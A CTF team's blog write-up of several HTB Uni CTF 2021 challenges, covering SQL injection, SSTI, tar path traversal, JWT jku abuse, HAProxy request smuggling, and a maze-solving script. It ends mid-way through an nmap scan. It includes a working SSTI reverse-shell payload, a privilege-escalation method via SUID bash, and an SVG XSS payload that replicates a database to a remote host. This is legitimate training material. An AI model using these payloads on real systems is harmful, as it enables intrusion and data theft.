<!DOCTYPE html><html class="appearance-dark" lang="en"><head><meta charset="UTF-8"><title>HTB Uni CTF 2021 Quals</title><meta name="description"><meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no, initial-scale=1"><!-- Google Analytics --><!-- End Google Analytics -->
<!-- Baidu Analytics --><!-- End Baidu Analytics --><link rel="icon" href="/favicon.png"><link rel="stylesheet" href="/style/common/bulma.css"><link rel="stylesheet" href="/style/base.css"><link rel="stylesheet" href="/style/common/helper.css"><script src="/js/common.js"></script><link rel="stylesheet" href="/style/post.css"><link rel="stylesheet" href="/style/themes/highlight-theme-light.css"><script src="/js/highlight.pack.js"></script><meta name="description" content="
The HTB UniCTF Qualifications 2021 took place from the 19.11.2021 to the 21.11.2021. We joined our universities team TeamWBH and placed 26th out of 597 teams. 
IntroductionThe CTF was definetly one of the harder ones we have done so far, but with a maximum team size of 10 students, 48 hours time and only 29 challenges they had to be really challenging to .."><meta name="generator" content="Hexo 5.4.0"></head><body class="is-flex is-flex-direction-column"><header class="header-widget is-flex-shrink-0 is-hidden-mobile"><div class="container is-fullhd is-flex is-justify-content-space-between is-align-items-center is-full-height"><section class="is-hidden-mobile is-flex-shrink-0"><h2><a href="/">NocentSec's blog</a></h2></section><h3 class="is-hidden-mobile is-family-serif is-full-height is-flex is-align-items-center is-flex-shrink-0"><div class="is-full-height" id="postTopic"><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">HTB Uni CTF 2021 Quals</p><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">Click back to the top</p></div></h3><aside class="is-flex-shrink-0"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/">About</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></aside></div></header><header class="is-flex header-widget is-flex-shrink-0 is-align-items-center is-justify-content-center is-hidden-tablet"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/">About</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></header><main><main class="container is-max-widescreen content section post-page pt-4 px-4"><div class="columns is-flex-desktop is-justify-content-center is-flex-direction-row-reverse"><div class="column is-3 is-hidden-mobile"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Introduction"><span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Fullpwn-GoodGames-user-amp-root"><span class="toc-text">Fullpwn - GoodGames user &amp; root</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Challenge-Description"><span class="toc-text">Challenge Description</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Solution"><span class="toc-text">Solution</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-Slippy"><span class="toc-text">Web - Slippy</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Challenge-Description-1"><span class="toc-text">Challenge Description</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Solution-1"><span class="toc-text">Solution</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-SteamCoin"><span class="toc-text">Web - SteamCoin</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Challenge-Description-2"><span class="toc-text">Challenge Description</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Solution-2"><span class="toc-text">Solution</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc-Insane-Bolt"><span class="toc-text">Misc - Insane Bolt</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Challenge-Description-3"><span class="toc-text">Challenge Description</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Solution-3"><span class="toc-text">Solution</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Cloud-Epsilon"><span class="toc-text">Cloud - Epsilon</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Challenge-Description-4"><span class="toc-text">Challenge Description</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Solution-4"><span class="toc-text">Solution</span></a></li></ol></li></ol></div><div class="column is-9"><header class="my-4"><a href="/tags/CTF"><i class="tag post-item-tag">CTF</i></a><a href="/tags/HackTheBox"><i class="tag post-item-tag">HackTheBox</i></a><a href="/tags/Web"><i class="tag post-item-tag">Web</i></a><a href="/tags/Misc"><i class="tag post-item-tag">Misc</i></a><a href="/tags/SQLi"><i class="tag post-item-tag">SQLi</i></a><a href="/tags/SSTI"><i class="tag post-item-tag">SSTI</i></a><a href="/tags/docker"><i class="tag post-item-tag">docker</i></a><a href="/tags/Fullpwn"><i class="tag post-item-tag">Fullpwn</i></a><a href="/tags/Maze"><i class="tag post-item-tag">Maze</i></a><a href="/tags/AWS"><i class="tag post-item-tag">AWS</i></a><a href="/tags/tarfile"><i class="tag post-item-tag">tarfile</i></a><a href="/tags/JWT"><i class="tag post-item-tag">JWT</i></a><a href="/tags/HAProxy"><i class="tag post-item-tag">HAProxy</i></a><a href="/tags/XSS"><i class="tag post-item-tag">XSS</i></a><a href="/tags/Cloud"><i class="tag post-item-tag">Cloud</i></a></header><h1 class="mt-0 mb-1 is-family-serif" id="postTitle">HTB Uni CTF 2021 Quals</h1><time class="has-text-grey" datetime="2021-11-22T20:47:30.000Z">2021-11-22</time><article class="mt-2 post-content"><p><img src="/2021/11/22/HTB-Uni-CTF-2021-Quals/header.png" alt="header displaying the logo of hackthebox&#39;s university CTF 2021"></p>
<p>The HTB UniCTF Qualifications 2021 took place from the 19.11.2021 to the 21.11.2021. We joined our universities team <a target="_blank" rel="noopener" href="https://ctftime.org/team/140413">TeamWBH</a> and placed 26th out of 597 teams. </p>
<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>The CTF was definetly one of the harder ones we have done so far, but with a maximum team size of 10 students, 48 hours time and only 29 challenges they had to be really challenging to keep approximately 5000 students busy. We had lots of fun but overall we enjoy CTFs with more challenges of less difficulty a little bit more. There were challenges which easily could’ve been split into two or three challenges on their own because they required to chain a couple of vulnerabilites. This is of course very exciting once you solve these, but really frustrating if you spent a lot of time and only manage to get three out of four steps and therefore no reward at all. However the idea of having whole HTB-Boxes in the category “Full Pwn” was something really refreshing to see and instantly took our attention.</p>
<p>We want to showcase some challenges in the following. These are either challenges that we like the most or challenges that we think we are most likely to see again in other CTFs so we can come back to this post and reuse or gained knowledge.</p>
<h2 id="Fullpwn-GoodGames-user-amp-root"><a href="#Fullpwn-GoodGames-user-amp-root" class="headerlink" title="Fullpwn - GoodGames user &amp; root"></a>Fullpwn - GoodGames user &amp; root</h2><p>GoodGames was the easy Fullpwn Challenge. We had to exploit a <a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting-web/sql-injection">SQL Injection</a> and <a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection">SSTI</a> for the user own and abuse an insecure file mount to achieve root own.</p>
<h3 id="Challenge-Description"><a href="#Challenge-Description" class="headerlink" title="Challenge Description"></a>Challenge Description</h3><p>N/A</p>
<h3 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h3><p>We immediately see a front page on Port 80.</p>
<p><img src="/2021/11/22/HTB-Uni-CTF-2021-Quals/good_games_fronpage.png" alt="screenshot of the front page of the web application on port 80"></p>
<p>Enumerating the machine we find a SQL Injection on the /login page and dump the entries with this payload:</p>
<pre><code class="bash">sqlmap -u &#39;http://goodgames.htb/login&#39; --data &#39;email=test%40test.htb&amp;password=12345&#39; -p &#39;email,password&#39; --method POST --dump
</code></pre>
<pre><code>Database: main
Table: user
[10 entries]
+----+------------+---------------------------+----------------------------------+
| id | name       | email                     | password                         |
+----+------------+---------------------------+----------------------------------+
| 1  | admin      | admin@goodgames.htb       | 2b22337f218b2d82dfc3b6f77e7cb8ec |
| 2  | test       | test@test.htb             | 827ccb0eea8a706c4c34a16891f84e7b |
+----+------------+---------------------------+----------------------------------+
</code></pre>
<p>We can crack the hash with <a target="_blank" rel="noopener" href="https://crackstation.net/">crackstation</a>:</p>
<p><img src="/2021/11/22/HTB-Uni-CTF-2021-Quals/crackstation.png" alt="sreenshot of the cracked hash"></p>
<p>We can now login as <code>admin:superadministrator</code> and find an admin panel at <code>internal-administration.goodgames.htb</code>. After adding the subdomain to our /etc/hosts file we can access it and login into the flask application using the same credentials again.</p>
<p>Flask applications in CTFs are most likely about SSTIs so that’s what we tried first. Changing the Full Name to the following gives us a reverse shell:</p>
<pre><code class="py">&#123;&#123;config.__class__.__init__.__globals__['os'].popen('python -c \'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.103",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")\'').read()&#125;&#125;
</code></pre>
<p>The user flag is located at <code>/home/augustus/user.txt</code>. We also find out, that we are in a docker instance.</p>
<p><img src="/2021/11/22/HTB-Uni-CTF-2021-Quals/goodgames_userflag.png" alt="screenshot of the user.txt"></p>
<p>The privilege escalation is rather simple. Looking at the dockers subnet we assumed the host machine to be at 172.19.0.1 to which we can just ssh from within the reverse shell <code>ssh augustus@172.19.0.1</code> using <code>superadministrator</code> as the password again.</p>
<p><img src="/2021/11/22/HTB-Uni-CTF-2021-Quals/goodgames_ssh.png" alt="ssh connection to the other ip"></p>
<p>We quickly realize that there are the same files in the home directory of the host machine as inside the docker. So we assumed an insecure mount. We can abuse this by simply copying bash to the home directory, log back into the docker where we are root and run <code>chown root:root bash &amp;&amp; chmod +s bash</code> to make it belong to root and set the suid bit. Now we can go back into the ssh session and run <code>./bash -p</code> to spawn a root shell.</p>
<p><img src="/2021/11/22/HTB-Uni-CTF-2021-Quals/goodgames_root.png" alt="root pwnage demonstrated by setting the suid bit on bash"></p>
<h2 id="Web-Slippy"><a href="#Web-Slippy" class="headerlink" title="Web - Slippy"></a>Web - Slippy</h2><p><img src="/2021/11/22/HTB-Uni-CTF-2021-Quals/slippy.png" alt="picture of the slippy fronpage displaying an upload field for tar.gz files"></p>
<p>This challenge was about a security issue in the tarfile python module. The issue is described <a target="_blank" rel="noopener" href="https://bugs.python.org/issue21109">here</a>. Basically if you craft a malicious archive in which the files have <code>paths</code> set as their name the application would place that file on that path and even replace it if there is already a file present. Below is the source of the challenge where you can see the application extracting the files using tarfile from our uploaded archives.</p>
<pre><code class="py">import functools, tarfile, tempfile, os
from application import main

generate = lambda x: os.urandom(x).hex()

def extract_from_archive(file):
    tmp  = tempfile.gettempdir()
    path = os.path.join(tmp, file.filename)
    file.save(path)

    if tarfile.is_tarfile(path):
        tar = tarfile.open(path, &#39;r:gz&#39;)
        tar.extractall(tmp)

        extractdir = f&#39;&#123;main.app.config[&quot;UPLOAD_FOLDER&quot;]&#125;/&#123;generate(15)&#125;&#39;
        os.makedirs(extractdir, exist_ok=True)

        extracted_filenames = []

        for tarinfo in tar:
            name = tarinfo.name
            if tarinfo.isreg():
                filename = f&#39;&#123;extractdir&#125;/&#123;name&#125;&#39;
                os.rename(os.path.join(tmp, name), filename)
                extracted_filenames.append(filename)
                continue
            
            os.makedirs(f&#39;&#123;extractdir&#125;/&#123;name&#125;&#39;, exist_ok=True)

        tar.close()
        return extracted_filenames

    return False
</code></pre>
<p><em>main.py</em></p>
<h3 id="Challenge-Description-1"><a href="#Challenge-Description-1" class="headerlink" title="Challenge Description"></a>Challenge Description</h3><p>You’ve found a portal for a firmware upgrade service, responsible for the deployment and maintenance of rogue androids hunting humans outside the tractor city. The question is… what are you going to do about it?</p>
<h3 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h3><p>We tried different approaches, there might be even a possibility to just symlink to the flag, however we didn’t quite get that working so we came up with this nice trick. We just replaced the <code>routes.py</code> to add a new route which would just give us the flag. This is what our <code>malicious</code> routes.py looks like:</p>
<pre><code class="py">from flask import Blueprint, request, render_template, abort, send_file
from application.util import extract_from_archive
import os

web = Blueprint(&#39;web&#39;, __name__)
api = Blueprint(&#39;api&#39;, __name__)

@web.route(&#39;/&#39;)
def index():
    return render_template(&#39;index.html&#39;)

@web.route(&#39;/test&#39;)
def index2():
    return send_file(&#39;/app/flag&#39;, attachment_filename=&#39;flag.txt&#39;)

@api.route(&#39;/unslippy&#39;, methods=[&#39;POST&#39;])
def cache():
    if &#39;file&#39; not in request.files:
        return abort(400)
    
    extraction = extract_from_archive(request.files[&#39;file&#39;])
    if extraction:
        return &#123;&quot;list&quot;: extraction&#125;, 200

    return &#39;&#39;, 204
</code></pre>
<p><em>routes.py</em></p>
<p>As you can see on browsing /test it should send us the flag located at /app/flag as flag.txt. We created the malicious tar-file with <a target="_blank" rel="noopener" href="https://github.com/ptoomey3/evilarc">evilarc</a> using this syntax:</p>
<pre><code>python evilarc.py routes.py -o unix -d 3 -p &#39;blueprints/&#39; -f test.tar.gz
</code></pre>
<p><img src="/2021/11/22/HTB-Uni-CTF-2021-Quals/slippy_solution.png" alt="screenshot displaying the successful exploit of the slippy web challenge"></p>
<h2 id="Web-SteamCoin"><a href="#Web-SteamCoin" class="headerlink" title="Web - SteamCoin"></a>Web - SteamCoin</h2><p><img src="/2021/11/22/HTB-Uni-CTF-2021-Quals/steamcoin.png" alt="picture of the slippy fronpage displaying a login form and the possibility to register"></p>
<p>This challenge is one of the <code>chaining exploits to get a flag</code> challenges. Before we go into it we want to make clear that we did not manage to get the flag during the competition but wanted to share this challenge anyways because it is really well designed and a lot of fun. We will point out during the solution part how far we got and where we got stuck.</p>
<h3 id="Challenge-Description-2"><a href="#Challenge-Description-2" class="headerlink" title="Challenge Description"></a>Challenge Description</h3><p>Meet SteamCoin, the first decentralized cryptocurrency of the SteamPunk realm that provides you the liberty to exchange value without intermediaries and translates to greater control of funds and lower fees. Sign up today in our SteamCoin wallet to get equipped with the tools and information you need to buy, sell, trade, invest, and spend SteamCoins.</p>
<h3 id="Solution-2"><a href="#Solution-2" class="headerlink" title="Solution"></a>Solution</h3><p>Before looking at the source we have a look at the webpage and see what obvious things we can do. We can register a new account, login to it and upload a <code>verification document</code> on the settings tab. We also get a JWT cookie so let’s have a look at that with <a target="_blank" rel="noopener" href="https://jwt.io/">jwt.io</a>.</p>
<p><img src="/2021/11/22/HTB-Uni-CTF-2021-Quals/jwt.png" alt="picture of the decoded JWT token"></p>
<p>The <code>jku-header</code> is set with an url to the jwks.json file containing the public key. This is already a sign for <a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens#jku">jku Claim Misuse</a>. This is basically a vulnerability where we would craft our own key-pair and send an URL pointing to our own public key in the <code>jku-header</code>. This allows us to have a valid signature while modifying the payload and achieve session/account takeover. </p>
<p>Having a look inside the <code>AuthMiddleware.js</code> however, prevents the <code>jku Claim Misuses</code> with this check:</p>
<pre><code class="js">if (header.jku.lastIndexOf(&#39;http://localhost:1337/&#39;, 0) !== 0) &#123;
    return res.status(500).send(response(&#39;The JWKS endpoint is not from localhost!&#39;));
&#125;
</code></pre>
<p><em>AuthMiddleWare.js</em></p>
<p>So it is not possible to point to our own public key… or is it? The public key has to be somewhere on localhost, but wasn’t there a file upload in the settings tab? Looking at the source code again we find out, that the file upload page only checks for the file ending, not the magic numbers or anything else:</p>
<pre><code class="js">const isValidFile = (file) =&gt; &#123; 
    return [
        &#39;jpg&#39;,
        &#39;png&#39;,
        &#39;svg&#39;,
        &#39;pdf&#39;
    ].includes(file.name.split(&#39;.&#39;).slice(-1)[0])
&#125;
</code></pre>
<p><em>routes/index.js</em></p>
<p>So we can simply create our keypair, create a jwk.json file containing our public key and rename it to end on .svg for example.</p>
<p>To create the keypair we do as <a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens#jku">HackTricks</a> describes:</p>
<pre><code>openssl genrsa -out keypair.pem 2048
openssl rsa -in keypair.pem -pubout -out publickey.crt
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key
</code></pre>
<p>Now we just download the original public key and change it to contain our values. To extract the values from our key we use <a target="_blank" rel="noopener" href="https://irrte.ch/jwt-js-decode/pem2jwk.html">this site</a>.</p>
<p>After that we rename it to end on .svg and upload it.</p>
<p><img src="/2021/11/22/HTB-Uni-CTF-2021-Quals/steamcoin_jwt.png" alt="upload successfull message"></p>
<p>Now we can change the payload in our jwt token to have <code>admin</code> as the username and the <code>jku-header</code> to point to <code>http://localhost:1337/uploads/cc56a3837236e1fd67928df1dd9a9c5c.svg</code></p>
<p><img src="/2021/11/22/HTB-Uni-CTF-2021-Quals/steamcoin_jwt_tampered.png" alt="tampered jwt token"></p>
<p>To continue we need to have a look at the source code:</p>
<pre><code class="js">router.post(&#39;/api/test-ui&#39;, AuthMiddleware, (req, res) =&gt; &#123;
    return db.getUser(req.data.username)
        .then(user =&gt; &#123;
            if (user.username !== &#39;admin&#39;) return res.status(403).send(response(&#39;You are not an admin!&#39;));
            let &#123; path, keyword &#125; = req.body;
            if (path, keyword) &#123;
                if (path.startsWith(&#39;/&#39;)) path = path.replace(&#39;/&#39;,&#39;&#39;);
                return ui_tester.testUI(path, keyword)
                    .then(resp =&gt; res.send(response(resp)))
                    .catch(e =&gt; res.send(response(e.toString())));
            &#125;
            return res.status(500).send(&#39;Missing required parameters!&#39;);
        &#125;)
        .catch(() =&gt; res.status(500).send(response(&#39;Authentication required!&#39;)));
&#125;);
</code></pre>
<p><em>routes/index.js</em></p>
<p>So we have an api endpoint at <code>/api/test-ui</code> that runs the <code>ui_tester.testUI</code> which is located in in the bot.js:</p>
<pre><code class="js">const testUI = async (path, keyword) =&gt; &#123;
    return new Promise(async (resolve, reject) =&gt; &#123;
        const browser = await puppeteer.launch(browser_options);
        let context = await browser.createIncognitoBrowserContext();
        let page = await context.newPage();
        try &#123;
            await page.goto(`http://127.0.0.1:1337/$&#123;path&#125;`, &#123;
                waitUntil: &#39;networkidle2&#39;
            &#125;);

            await page.waitForTimeout(8000);
            
            await page.evaluate((keyword) =&gt; &#123;
                return document.querySelector(&#39;body&#39;).innerText.includes(keyword)
            &#125;, keyword)
                .then(isMatch =&gt; resolve(isMatch));
        &#125; catch(e) &#123;
            reject(false);
        &#125;
        await browser.close();
    &#125;);
&#125;;
</code></pre>
<p><em>bot.js</em></p>
<p>Trying to POST something to it however returns a <code>403 Forbidden, Request forbidden by administrative rules.</code></p>
<p><img src="/2021/11/22/HTB-Uni-CTF-2021-Quals/steamcoin_post.png" alt="burp request displaying the 403 Forbidden"></p>
<p>So there has to be some kind of WAF, let’s have another look at the source. We can find the respective rule in <code>/config/haproxy.cfg</code>:</p>
<pre><code>frontend http-in
    bind *:80
    default_backend web
    acl network_allowed src 127.0.0.1
    acl restricted_page path_beg /api/test-ui
    http-request deny if restricted_page !network_allowed
</code></pre>
<p><em>/config/haproxy.cfg</em></p>
<p>There is a programm called <code>HAProxy</code> running which is a load balancer proxy server that is not allowing us to connect to that api endpoint unless we are from within the local network. Googling the version and name we quickly find <a target="_blank" rel="noopener" href="https://jfrog.com/blog/critical-vulnerability-in-haproxy-cve-2021-40346-integer-overflow-enables-http-smuggling/">this post about CVE-2021-40346</a> describing an integer overflow in the <code>Content-Length</code> header that allows to bypass these ACL rules we find in the haproxy.cfg by using HTTP request smuggeling. </p>
<p>This is where we got stuck during the contest, we were able to get HTTP request smuggeling to work, however it wouln’t bypass the ACL rules for some reasons that are still unknown to us to this point. So what follows is the intended way from the challenges author.</p>
<p>// FUNFACT: there was also an unintended bypass of the ACL rule because it wasn’t case sensitive. So a request to /Api/test-ui would’ve worked aswell.</p>
<p>To understand the full exploit we have to have another look at the source code:</p>
<pre><code class="js">class Database &#123;

    async init() &#123;
        this.couch = nano(&#39;http://admin:youwouldntdownloadacouch@localhost:5984&#39;);
        await this.couch.db.create(&#39;users&#39;, (err) =&gt; &#123;  
            if (err &amp;&amp; err.statusCode != 412) &#123;
                console.error(err);
            &#125;
            this.userdb = this.couch.use(&#39;users&#39;);
            let adminUser = &#123;  
                username: &#39;admin&#39;,
                password: crypto.randomBytes(13).toString(&#39;hex&#39;),
                verification_doc: &#39;HTB&#123;f4k3_fl4g_f0r_t3st1ng&#125;&#39;
            &#125;;
            this.userdb.insert(adminUser, adminUser.username)
                .catch(() =&gt; &#123;&#125;);
        &#125;); 
    &#125;
</code></pre>
<p><em>database.js</em></p>
<p>The <code>database.js</code> leaks valid credentials for the couchdb database that hold the flag within the verification_doc column of the admin user. So the attack plan here is to bypass the ACL rule in HAProxy to let the <code>bot.js</code> <code>testUI()</code> send a request to the couchdb database that reads the flag. We can achieve this with a <a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting">XSS</a> inside of another SVG file. So we first create another user and upload another SVG file containing this payload:</p>
<pre><code class="js">&lt;?xml version=&quot;1.0&quot; standalone=&quot;no&quot;?&gt;
&lt;!DOCTYPE svg PUBLIC &quot;-//W3C//DTD SVG 1.1//EN&quot; &quot;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&quot;&gt;

&lt;svg version=&quot;1.1&quot; baseProfile=&quot;full&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt;
   &lt;rect width=&quot;100&quot; height=&quot;100&quot; style=&quot;fill:rgb(0,0,64);stroke-width:3;stroke:rgb(0,0,0)&quot; /&gt;
   &lt;script type=&quot;text/javascript&quot;&gt;
        xhr = new XMLHttpRequest();
        authToken = &quot;Basic &quot; + btoa(&#39;admin&#39; + &quot;:&quot; + &#39;youwouldntdownloadacouch&#39;);
        xhr.open(&quot;POST&quot;, &quot;http://127.0.0.1:5984/_replicate&quot;,true);
        xhr.setRequestHeader(&quot;Authorization&quot;, authToken);
        xhr.setRequestHeader(&quot;Content-Type&quot;, &quot;application/json;charset=UTF-8&quot;);

        xhr.onload = function (e) &#123;
        console.log(e);
        &#125;;
        xhr.onerror = function (e) &#123;
        console.log(e);
        &#125;;
        xhr.send(`&#123;&quot;source&quot;:&quot;users&quot;,&quot;target&quot;:&#123;&quot;url&quot;:&quot;http://REMOTE_IP:5984/users&quot;,&quot;headers&quot;:&#123;&quot;Authorization&quot;:&quot;$&#123;authToken&#125;&quot;&#125;&#125;&#125;`);
   &lt;/script&gt;
&lt;/svg&gt;
</code></pre>
<p>This is a simple script that sends a <a target="_blank" rel="noopener" href="https://guide.couchdb.org/draft/replication.html">replication</a> request to the couchdb and passes it to our REMOTE_IP.</p>
<p>We can then trigger it with this HTTP request smuggeling request in Burp:</p>
<pre><code>POST /api/login HTTP/1.1
Host: localhost
Content-Length0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa:
Content-Length: 787

POST /api/test-ui HTTP/1.1
Host: localhost:1337
Content-Type: application/json
Cookie: session=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9sb2NhbGhvc3Q6MTMzNy91cGxvYWRzLzc3MTNhMzM5MTFhZjZiMDJkMWE4YTQ5ODMxMjA5YWI3LnBkZiIsImtpZCI6ImYwZjAyMmNiLTUzMGMtNGI4ZC1iZmIyLWMyNTExZjMzZDcwOSJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNjM2OTcwNjkzfQ.JEIPl2UC6akQDtx3u0nX2f6UygAIj8wkAwpaFZRBjUHMHXBQ2eWMmEz2pci49i7nWMHnwkjO7S_wgjlNQkqpESrY3VhU0tndLLeNu6P5BPPW2cEhVKBJp1ZQb1HoI7DaVMm3bidVK_Rc9FeUe_oieqYE7zXMLQ4WjRmz7yetvpr918gMlV-wmjT3o3xijs4Kql7PA1up6g0P8QRxw1DgV4ItX5AcPwltglEx-BOFir7e-3o4yTPg8JAslhZkTtvB5rjjuSZxal9OMB2gS8Xm31tdQXQHCX2XQyL_3ScVEiBKC6RzbjBILPznZCR6Dq1ZF8rYDDqRjSY-Es9oHC-qdA
Content-Length: 75

&#123;&quot;path&quot;:&quot;/uploads/efb023c476ff09fdd61142d575d77200.svg&quot;, &quot;keyword&quot;: &quot;test&quot;&#125;
</code></pre>
<p>As we said earlier we didn’t manage to get the flag here but we had all the pieces, we even had some XSS attempts during the competition. It was a really nice challenge, kudos to <a target="_blank" rel="noopener" href="https://twitter.com/makelariss">@makelariss</a> for designing it.</p>
<h2 id="Misc-Insane-Bolt"><a href="#Misc-Insane-Bolt" class="headerlink" title="Misc - Insane Bolt"></a>Misc - Insane Bolt</h2><p>This was an automation challenge. Once connected to the given ip and port we were sent some instructions on how to play and a maze to solve. The challenge was to solve 500 of these mazes within a short amount of time while always going the ideal way.</p>
<p><img src="/2021/11/22/HTB-Uni-CTF-2021-Quals/insane_bolt.png" alt="screenshot of the netcat connection to the insane bolt challenge"></p>
<h3 id="Challenge-Description-3"><a href="#Challenge-Description-3" class="headerlink" title="Challenge Description"></a>Challenge Description</h3><p>This insane scientist wants to craft the most powerful android in the world! Help him collect many 🔩 to achieve his goal. Also, he needs many 💎 to make it even more strong and pwoerful than any other android. Good luck adventurer!</p>
<h3 id="Solution-3"><a href="#Solution-3" class="headerlink" title="Solution"></a>Solution</h3><p>We wrote this simple python script to solve the challenge for us.</p>
<pre><code class="py">#!/usr/bin/python3
# HTB UniCTF2021Quali InsaneBolt Challenge

import nclib

flame = b&quot;\xf0\x9f\x94\xa5&quot;
skull = b&quot;\xe2\x98\xa0\xef\xb8\x8f&quot;
screw = b&quot;\xf0\x9f\x94\xa9&quot;
diamond = b&quot;\xf0\x9f\x92\x8e&quot;
robot = b&quot;\xf0\x9f\xa4\x96&quot;

nc = nclib.Netcat((&#39;IP_ADRESS&#39;, PORT), verbose=False)
start = &quot;&gt;&quot;
recv = nc.recv_until(start.encode(&#39;utf-8&#39;))
nc.send((&quot;2\n&quot;).encode())
recv = nc.recv_until(start.encode(&#39;utf-8&#39;))

first_run = True

count_diamonds = 0
solution = &quot;&quot;
direction = 1

while count_diamonds &lt; 500:
    if (not first_run):
        start = b&quot;\xf0\x9f\x94\xa9 !&quot;
        recv = nc.recv_until(start)

        start = &quot;&gt;&quot;
        recv = nc.recv_until(start.encode(&#39;utf-8&#39;))

    print(recv.decode())
    content = recv.splitlines()
    
    content.pop()
    content.pop()
    content.pop(0)
    if (not first_run):
        content.pop(0)

    count_rows = len(content)
    count_columns = content[0].count(b&#39; &#39;)

    maze = []

    for row in content:
        row = row.split(b&quot; &quot;)
        row.pop()
        row = list(filter((b&#39;&#39;).__ne__, row))
        maze.append(row)

    direction = 1
    solution = &quot;&quot;
    position = [1,maze[1].index(robot)]
    fallback = position
    while position[1] &lt; count_rows -2:
        row = position[0]
        column = position[1]
        if maze[row+1][column] == diamond:
            solution = solution + &quot;D&quot;
            count_diamonds = count_diamonds + 1
            break;
        elif maze[row+1][column] == screw:
            solution = solution + &quot;D&quot;
            position = [row+1,column]
            fallback = position
        elif maze[row][column-direction] == screw:
            solution = solution + str(direction)
            position = [row,column-direction]
        else:
            solution = solution.rstrip(str(direction))
            position = fallback
            direction = direction * (-1)

    solution = solution.replace(&quot;-1&quot;,&quot;R&quot;)
    solution = solution.replace(&quot;1&quot;,&quot;L&quot;)
    solution = solution + &quot;\n&quot;
    print(&quot;[+] Sending this solution: &quot; + solution.strip())
    print(&quot;[+] You have &quot; + str(count_diamonds) + &quot; 💎!&quot;)
    nc.send(solution.encode())
    first_run = False

recv = nc.recv_all();
print(recv.decode().strip());
</code></pre>
<p>As you can see, we took a simplified backtracking approach. We always try to step down. If there is an obstacle we try to go left or right. After each step down we save the current position in a <code>fallback</code> variable, so once we find ourselves in a dead end we can ‘go’ back to that position and delete the corresponding characters from our solution string.<br>Hence all steps are written in one string and sent at the and of each loop, we always get a clean solution without unnecessary steps. This way we managed to collect all the screws and diamonds we needed.</p>
<h2 id="Cloud-Epsilon"><a href="#Cloud-Epsilon" class="headerlink" title="Cloud - Epsilon"></a>Cloud - Epsilon</h2><p>This cloud challenge was about aws and a <a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection">SSTI</a>. We were given a whole machine where we had to use the given openvpn connection. </p>
<h3 id="Challenge-Description-4"><a href="#Challenge-Description-4" class="headerlink" title="Challenge Description"></a>Challenge Description</h3><p>One of the local shops in your city is realising new costumes. Go grab them before they run out as the available stock is very limited.</p>
<h3 id="Solution-4"><a href="#Solution-4" class="headerlink" title="Solution"></a>Solution</h3><p>Since this is a whole machine we started with a nmap scan:</p>
<pre><code>╰─$ nmap -A 10.129.96.99
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-23 14:59 CET
Nmap scan report for epsilon.htb (10.129.96.99)
Host is up (0.038s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
